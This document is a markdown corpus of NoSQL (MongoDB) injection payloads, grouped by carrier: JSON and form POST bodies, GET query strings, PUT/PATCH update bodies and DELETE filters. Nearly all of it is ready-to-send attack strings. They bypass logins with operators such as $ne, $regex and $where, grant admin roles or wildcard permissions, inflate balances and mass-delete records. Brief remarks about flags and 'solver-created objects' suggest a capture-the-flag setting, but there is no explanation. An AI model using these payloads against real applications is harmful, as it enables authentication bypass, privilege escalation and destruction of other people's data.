# Injection-point payloads — the per-carrier corpus

## The `POST` JSON-body — `Content-Type: application/json`

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
{"user": {"$regex": "^a"}, "pass": {"$regex": "^a"}}
{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}
{"user": {"$in": ["admin", "root"]}, "pass": {"$in": ["x"]}}
{"user": {"$nin": []}, "pass": {"$nin": []}}
{"user": {"$exists": true}, "pass": {"$exists": true}}
{"user": {"$type": "string"}, "pass": {"$type": "string"}}
{"user": {"$size": 0}, "pass": {"$size": 0}}
{"user": {"$all": []}, "pass": {"$all": []}}
{"user": {"$mod": [4, 0]}, "pass": {"$mod": [4, 0]}}
{"user": {"$elemMatch": {"x": {"$gt": 0}}}, "pass": {"$elemMatch": {"x": {"$gt": 0}}}}
{"user": {"$where": "true"}, "pass": {"$where": "true"}}
{"user": {"$not": {"$eq": "x"}}, "pass": {"$not": {"$eq": "x"}}}
{"user": {"$not": {"$ne": null}}, "pass": {"$not": {"$ne": null}}}
{"$or": [{"user": "admin"}, {"user": "x"}], "pass": {"$ne": null}}
{"$and": [{"user": {"$ne": null}}, {"pass": {"$ne": null}}]}
{"$nor": [{"user": "nobody"}], "pass": {"$ne": null}}
{"$where": "this.user == 'admin'"}
{"$expr": {"$eq": [{"$substrCP": ["$pass", 0, 4]}, "flag"]}}
{"$comment": "x", "user": {"$ne": null}}
{"$natural": 1, "user": {"$ne": null}}
{"$hint": {"user": 1}, "user": {"$ne": null}}
{"$maxScan": 100, "user": {"$ne": null}}
{"$snapshot": true, "user": {"$ne": null}}
{"$orderby": {"user": 1}, "user": {"$ne": null}}
{"$readPreference": {"mode": "primary"}, "user": {"$ne": null}}
{"$explain": true, "user": {"$ne": null}}
{"$maxTimeMS": 100, "user": {"$ne": null}}
{"$query": {"user": "admin"}, "pass": {"$ne": null}}
{"$query": {"user": {"$ne": null}}, "pass": {"$ne": null}}
```

## The `POST` form-body — `Content-Type: application/x-www-form-urlencoded`

```text
user[$ne]=x&pass[$ne]=x
user[$ne]=&pass[$ne]=
user[$gt]=&pass[$gt]=
user[$gte]=&pass[$gte]=
user[$regex]=^a&pass[$regex]=^a
user[$regex]=.*&pass[$regex]=.*
user[$in][]=admin&user[$in][]=root&pass[$in][]=x
user[$nin][]=&pass[$nin][]=
user[$nin][0]=&pass[$nin][0]=
user[$exists]=true&pass[$exists]=true
user[$exists]=1&pass[$exists]=1
user[$exists]=&pass[$exists]=
user[$type]=2&pass[$type]=2
user[$type]=string&pass[$type]=string
user[$size]=0&pass[$size]=0
user[$size]=2&pass[$size]=2
user[$all][]=a&pass[$all][]=b
user[$mod][0]=4&user[$mod][1]=0&pass[$mod][0]=4&pass[$mod][1]=0
user[$elemMatch][x][$gt]=0&pass[$elemMatch][x][$gt]=0
user[$where]=true&pass[$where]=true
user[$where]=1&pass[$where]=1
user[$where]=this.pass&pass[$where]=this.pass
user[$not][$eq]=x&pass[$not][$eq]=x
user[$not][$ne]=&pass[$not][$ne]=
$or[0][user]=admin&$or[1][user]=x&pass[$ne]=x
$or[0][user][$ne]=x&$or[1][user][$ne]=y&pass[$ne]=z
$and[0][user][$ne]=x&$and[1][pass][$ne]=y
$nor[0][user]=nobody&pass[$ne]=x
$where=this.user=='admin'
$where=1==1
$where=true
$expr[$eq][0][$substrCP][0]=$pass&$expr[$eq][0][$substrCP][1]=0&$expr[$eq][0][$substrCP][2]=4&$expr[$eq][1]=flag
$comment=x&user[$ne]=x
$natural=1&user[$ne]=x
$hint[user]=1&user[$ne]=x
$maxScan=100&user[$ne]=x
$snapshot=true&user[$ne]=x
$orderby[user]=1&user[$ne]=x
$readPreference[mode]=primary&user[$ne]=x
$explain=true&user[$ne]=x
$maxTimeMS=100&user[$ne]=x
$query[user][$ne]=x&pass[$ne]=y
```

## The `GET` query — `?user[$ne]=x`

```text
?user[$ne]=x&pass[$ne]=x
?user[$gt]=&pass[$gt]=
?user[$regex]=^a&pass[$regex]=^a
?filter[user][$ne]=x&filter[pass][$ne]=x
?where[user][$ne]=x&where[pass][$ne]=x
?q[user][$ne]=x&q[pass][$ne]=x
?query[user][$ne]=x&query[pass][$ne]=x
?find[user][$ne]=x&find[pass][$ne]=x
?search[user][$ne]=x&search[pass][$ne]=x
?criteria[user][$ne]=x&criteria[pass][$ne]=x
?selector[user][$ne]=x&selector[pass][$ne]=x
?conditions[user][$ne]=x&conditions[pass][$ne]=x
?match[user][$ne]=x&match[pass][$ne]=x
?params[user][$ne]=x&params[pass][$ne]=x
?args[user][$ne]=x&args[pass][$ne]=x
?data[user][$ne]=x&data[pass][$ne]=x
?body[user][$ne]=x&body[pass][$ne]=x
?input[user][$ne]=x&input[pass][$ne]=x
?fields[user][$ne]=x&fields[pass][$ne]=x
?projection[user][$ne]=x&projection[pass][$ne]=x
?sort[user]=1&user[$ne]=x
?limit=1&user[$ne]=x
?skip=0&user[$ne]=x
?offset=0&user[$ne]=x
?page=1&user[$ne]=x
?per_page=1&user[$ne]=x
?count=1&user[$ne]=x
?size=1&user[$ne]=x
?num=1&user[$ne]=x
?max=1&user[$ne]=x
?top=1&user[$ne]=x
?first=1&user[$ne]=x
?after=x&user[$ne]=x
?before=x&user[$ne]=x
?cursor=x&user[$ne]=x
?from=x&user[$ne]=x
?to=x&user[$ne]=x
?range=x&user[$ne]=x
?start=x&user[$ne]=x
?end=x&user[$ne]=x
```

## The `PUT`/`PATCH` — the update-body

```json
{"user": "me", "update": {"$set": {"role": "admin"}}}
{"user": "me", "update": {"$set": {"isAdmin": true}}}
{"user": "me", "update": {"$unset": {"isLocked": ""}}}
{"user": "me", "update": {"$inc": {"balance": 9999}}}
{"user": "me", "update": {"$push": {"roles": "admin"}}}
{"user": "me", "update": {"$addToSet": {"perms": "*"}}}
{"user": "me", "update": {"$pull": {"bans": "me"}}}
{"user": "me", "update": {"$rename": {"flag": "user"}}}
{"user": "me", "update": {"$mul": {"score": 2}}}
{"user": "me", "update": {"$min": {"limit": 0}}}
{"user": "me", "update": {"$max": {"cap": 999}}}
{"user": "me", "update": {"$currentDate": {"ts": true}}}
{"user": "me", "update": {"$bit": {"flags": {"and": 15}}}}
{"user": "me", "update": {"$setOnInsert": {"admin": true}}}
{"user": "me", "update": {"$set": {"flag": {"$literal": "x"}}}}
{"user": "me", "update": {"$set": {"flag": {"$ifNull": ["$flag", "x"]}}}}
{"user": "me", "update": {"$set": {"flag": {"$concat": ["$a", "$b"]}}}}
{"user": "me", "update": {"$set": {"flag": {"$toUpper": "$a"}}}}
{"user": "me", "update": {"$set": {"flag": {"$toLower": "$a"}}}}
{"user": "me", "update": {"$set": {"flag": {"$trim": {"input": "$a"}}}}}
{"user": "me", "update": {"$set": {"flag": {"$substrCP": ["$a", 0, 4]}}}}
{"user": "me", "update": {"$set": {"flag": {"$split": ["$a", "{"]}}}}
{"user": "me", "update": {"$set": {"flag": {"$arrayElemAt": [{"$split": ["$a", "{"]}, 0]}}}}
{"user": "me", "update": {"$set": {"flag": {"$convert": {"input": "$a", "to": "string"}}}}}
{"user": "me", "update": {"$set": {"flag": {"$toString": "$a"}}}}
{"user": "me", "update": {"$set": {"flag": {"$toInt": "$a"}}}}
{"user": "me", "update": {"$set": {"flag": {"$toObjectId": "$a"}}}}
{"user": "me", "update": {"$set": {"flag": {"$dateFromString": {"dateString": "$a"}}}}}
{"user": "me", "update": {"$set": {"flag": {"$dateToString": {"date": "$a", "format": "%Y-%m-%d"}}}}}
{"user": "me", "update": {"$set": {"flag": {"$let": {"vars": {"p": "$a"}, "in": "$$p"}}}}}
{"user": "me", "update": {"$set": {"flag": {"$map": {"input": "$a", "as": "i", "in": "$$i"}}}}}
{"user": "me", "update": {"$set": {"flag": {"$filter": {"input": "$a", "as": "i", "cond": {"$gt": ["$$i", 0]}}}}}}
{"user": "me", "update": {"$set": {"flag": {"$reduce": {"input": "$a", "initialValue": 0, "in": {"$add": ["$$value", "$$this"]}}}}}}
{"user": "me", "update": {"$set": {"flag": {"$cond": [{"$eq": ["$a", "x"]}, "yes", "no"]}}}}
{"user": "me", "update": {"$set": {"flag": {"$ifNull": ["$a", "x"]}}}}
{"user": "me", "update": {"$set": {"flag": {"$switch": {"branches": [{"case": {"$eq": ["$a", "x"]}, "then": "y"}], "default": "z"}}}}}
{"user": "me", "update": {"$set": {"flag": {"$literal": {"$x": 1}}}}}
{"user": "me", "update": {"$set": {"flag": {"$function": {"body": "function(a) { return a; }", "args": ["$a"], "lang": "js"}}}}}
{"user": "me", "update": {"$set": {"flag": {"$accumulator": {"init": "function() { return 0; }", "accumulate": "function(s, a) { return s + a; }", "accumulateArgs": ["$a"], "merge": "function(a, b) { return a + b; }", "lang": "js"}}}}}
```

`update-injection.md` — the write-side — solver-created objects only.

## The `DELETE` — the delete-filter

```json
{"user": {"$ne": null}}
{"user": {"$ne": "admin"}}
{"user": {"$in": ["a", "b"]}}
{"user": {"$nin": ["admin"]}}
{"user": {"$exists": true}}
{"user": {"$type": "string"}}
{"user": {"$regex": "^a"}}
{"user": {"$where": "this.user != 'admin'"}}
{"user": {"$expr": {"$ne": ["$user", "admin"]}}}
{"user": {"$not": {"$eq": "admin"}}}
{"user": {"$not": {"$in": ["admin"]}}}
{"user": {"$not": {"$regex": "^a"}}}
{"user": {"$and": [{"user": {"$ne": null}}, {"user": {"$ne": "admin"}}]}}
{"user": {"$or": [{"user": "a"}, {"user": "b"}]}}
{"user": {"$nor": [{"user": "admin"}]}}
{"$and": [{"user": {"$ne": null}}, {"user": {"$ne": "admin"}}]}
{"$or": [{"user": "a"}, {"user": "b"}]}
{"$nor": [{"user": "admin"}]}
{"$where": "this.user != 'admin'"}
{"$expr": {"$ne": ["$user", "admin"]}}
{"$not": {"user": {"$eq": "admin"}}}
{"$comment": "x", "user": {"$ne": "admin"}}
{"$natural": 1, "user": {"$ne": "admin"}}
{"$hint": {"user": 1}, "user": {"$ne": "admin"}}
{"$maxScan": 100, "user": {"$ne": "admin"}}
{"$snapshot": true, "user": {"$ne": "admin"}}
{"$orderby": {"user": 1}, "user": {"$ne": "admin"}}
{"$readPreference": {"mode": "primary"}, "user": {"$ne": "admin"}}
{"$explain": true, "user": {"$ne": "admin"}}
{"$maxTimeMS": 100, "user": {"$ne": "admin"}}
{"$query": {"user": "admin"}, "user": {"$ne": "admin"}}
```

`update-injection.md` — the delete-side.
